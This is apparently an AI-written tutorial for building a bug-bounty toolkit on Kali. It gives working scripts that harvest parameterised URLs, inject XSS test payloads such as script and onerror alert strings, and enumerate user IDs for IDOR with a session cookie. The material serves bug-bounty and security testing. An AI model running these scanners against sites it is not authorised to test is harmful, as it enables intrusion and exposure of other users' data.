
## Step 1: Create project folder

In Kali, on Desktop or in your home:

```bash
mkdir -p ~/xss_idor_suite/{output,logs}
cd ~/xss_idor_suite
```

This keeps URLs, params, and logs organized like in the blog (output/example.com, logs/XSS.md etc.).[1]

***

## Step 2: Install core dependencies

In the project folder (or anywhere in terminal):

```bash
sudo apt update
sudo apt install -y python3 python3-pip curl jq git
pip3 install requests
```

These give you Python 3, pip, curl, jq, git, and the requests library used in the Python scripts.[1]

***

## Step 3: Install helper tools (optional but recommended)

### 3.1 waybackurls (for URLs and params)

```bash
cd ~
git clone https://github.com/tomnomnom/waybackurls
cd waybackurls
go build
sudo mv waybackurls /usr/local/bin/
```

This lets you run `waybackurls domain.com` from anywhere.[1]

### 3.2 Arjun (hidden parameters)

```bash
cd ~
git clone https://github.com/s0md3v/Arjun
cd Arjun
pip3 install -r requirements.txt
```

You will call it as `python3 Arjun/arjun.py -u https://target/api/...`.[2]

### 3.3 Dalfox (DOM XSS etc., later)

Using snap (works on Kali with snapd):

```bash
sudo apt install -y snapd
sudo systemctl enable --now snapd apparmor
sudo snap install dalfox
```

Then you can run `dalfox url https://example.com/?q=test`.[3][4]

***

## Step 4: Create get_params.sh (Module 1)

Go back to your suite folder:

```bash
cd ~/xss_idor_suite
nano get_params.sh
```

Paste this and save:

```bash
#!/bin/bash

domain=$1

if [ -z "$domain" ]; then
  echo "Usage: $0 example.com"
  exit 1
fi

echo "[*] Collecting endpoints for $domain..."
mkdir -p output/$domain

echo "[*] Using waybackurls..."
waybackurls $domain | tee output/$domain/urls.txt

echo "[*] Extracting URLs with parameters..."
cat output/$domain/urls.txt | grep "=" | tee output/$domain/params.txt

echo "[+] Done! Found $(wc -l < output/$domain/params.txt) URLs with params."
```

Make executable:

```bash
chmod +x get_params.sh
```

Now `./get_params.sh example.com` will create `output/example.com/urls.txt` and `output/example.com/params.txt`.[1]

***

## Step 5: Basic XSS scanner (Module 2)

Create the Python script:

```bash
cd ~/xss_idor_suite
nano xss_scanner.py
```

Add:

```python
import requests
from urllib.parse import urlparse, parse_qs, urlencode
import os

payloads = [
    "<script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "' onfocus='alert(1)",
    "<body onresize=alert(1)>"
]

headers = {'User-Agent': 'XSSScanner/1.0'}

def scan_xss(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    if not query:
        return

    for param in query:
        for payload in payloads:
            query[param] = payload
            new_query = urlencode(query, doseq=True)
            target = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            try:
                r = requests.get(target, headers=headers, timeout=5, verify=False)
                if payload in r.text:
                    print(f"[!] XSS found in: {target}")
            except Exception:
                continue

def main():
    domain = os.environ.get("TARGET_DOMAIN", "example.com")
    params_file = f"output/{domain}/params.txt"

    if not os.path.exists(params_file):
        print(f"[!] Params file not found: {params_file}")
        return

    with open(params_file) as f:
        for line in f:
            scan_xss(line.strip())

if __name__ == "__main__":
    main()
```

This reads `output/<domain>/params.txt` and injects multiple payloads.[1]

***

## Step 6: Simple IDOR tester (Module 3)

```bash
cd ~/xss_idor_suite
nano idor_test.py
```

Example generic version:

```python
import requests

session = requests.Session()

base_url = "https://target.com/profile?id="  # change this per target
start_id = 1000
end_id = 1050

# Optional: set cookies if needed
session.cookies.set("session", "your_session_cookie_here")

for i in range(start_id, end_id):
    url = f"{base_url}{i}"
    r = session.get(url, timeout=5, verify=False)
    if "user not found" not in r.text.lower():
        print(f"[+] Interesting ID found: {url}")
```

Before running it, you manually tune `base_url`, range, and the string that indicates a “not found” response.[1]

***

## Step 7: Basic auth handler (Module 5)

```bash
cd ~/xss_idor_suite
nano auth_config.json
```

Example:

```json
{
  "cookies": {
    "session": "your-session-id"
  },
  "headers": {
    "Authorization": "Bearer YOUR_API_TOKEN"
  }
}
```

Now `auth_handler.py`:

```bash
nano auth_handler.py
```

```python
import json
import requests

def get_auth_session():
    with open("auth_config.json") as f:
        config = json.load(f)

    session = requests.Session()

    for name, value in config.get("cookies", {}).items():
        session.cookies.set(name, value)

    for header, value in config.get("headers", {}).items():
        session.headers[header] = value

    return session
```

You can later modify `xss_scanner.py` and `idor_test.py` to use `session = get_auth_session()` instead of raw `requests`.[1]

***

## Step 8: Logging base (Module 6, simple)

Create `logs` folder already exists; now a simple logging helper:

```bash
cd ~/xss_idor_suite
nano logger.py
```

```python
from datetime import datetime
import csv
import os

def log_bug(url, payload, issue_type="XSS"):
    os.makedirs("logs", exist_ok=True)
    md_path = f"logs/{issue_type}.md"
    with open(md_path, "a") as f:
        f.write(f"### {issue_type.upper()} Bug\n")
        f.write(f"- URL: `{url}`\n")
        f.write(f"- Payload: `{payload}`\n")
        f.write(f"- Timestamp: {datetime.now().isoformat()}\n")
        f.write("---\n")

    csv_path = "logs/summary.csv"
    with open(csv_path, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([datetime.now().isoformat(), url, issue_type, payload])
```

Then at the top of `xss_scanner.py`:

```python
from logger import log_bug
```

And inside the XSS detection block:

```python
if payload in r.text:
    print(f"[!] XSS found in: {target}")
    log_bug(target, payload)
```

Now you get markdown + CSV logs per bug found.[1]

***

## Step 9: Arjun wrapper (Module 4)

```bash
cd ~/xss_idor_suite
nano arjun_bruter.py
```

```python
import os

target_url = input("Enter the endpoint to bruteforce parameters: ")
os.makedirs("output", exist_ok=True)
output_file = "output/arjun_params.txt"

cmd = f"python3 ~/Arjun/arjun.py -u \"{target_url}\" -oT {output_file}"
os.system(cmd)

with open(output_file) as f:
    print("\n[+] Discovered Parameters:")
    for param in f:
        print(" -", param.strip())
```

You can later feed `arjun_params.txt` to your XSS scanner, or manually test them.[2][1]

***

## Step 10: main.sh to chain everything

```bash
cd ~/xss_idor_suite
nano main.sh
```

```bash
#!/bin/bash

domain=$1

if [ -z "$domain" ]; then
  echo "Usage: $0 example.com"
  exit 1
fi

export TARGET_DOMAIN=$domain

echo "🎯 Starting Bug Hunting Suite on $domain"

./get_params.sh $domain
python3 xss_scanner.py
python3 idor_test.py

echo "✅ Done! Check output/ and logs/ for results."
```

Make executable:

```bash
chmod +x main.sh
```

Now your “one command” workflow becomes:

```bash
cd ~/xss_idor_suite
./main.sh example.com
```

This mimics exactly what you want: select a target domain, run one script, and let the toolkit perform param discovery and basic XSS/IDOR checks.[1]

***

## How to proceed from here

1. First time, test against a **lab / your own domain**, not a random live target, to verify everything works.
2. Once stable, gradually:
   - Swap in `auth_handler` to support authenticated targets.
   - Add Dalfox (`dalfox file output/<domain>/params.txt`) and parse its results into `logger.py`.[4][3]
   - Add Slack/email notifiers as separate modules when you are comfortable.


[1](https://infosecwriteups.com/automate-xss-idor-bug-hunting-using-bash-python-a-hackers-toolkit-e8453e51f703)
[2](https://github.com/s0md3v/Arjun)
[3](https://github.com/hahwul/dalfox)
[4](https://www.geeksforgeeks.org/linux-unix/dalfox-parameter-analysis-and-xss-scanning-tool/)
[5](https://systemweakness.com/automating-xss-4f20b4b11e70)
[6](https://thegrayarea.tech/how-i-got-my-first-reflected-xss-bug-bounty-8c285ec69769)
[7](https://infosecwriteups.com/how-i-hacked-100-accounts-using-just-xss-7cd61aa785c9)
[8](https://github.com/hahwul/WebHackersWeapons)
[9](https://www.intigriti.com/researchers/blog/hacking-tools/hacker-tools-arjun-the-parameter-discovery-tool)
[10](https://bugcrowd.com/KIRAN-KUMAR-K)
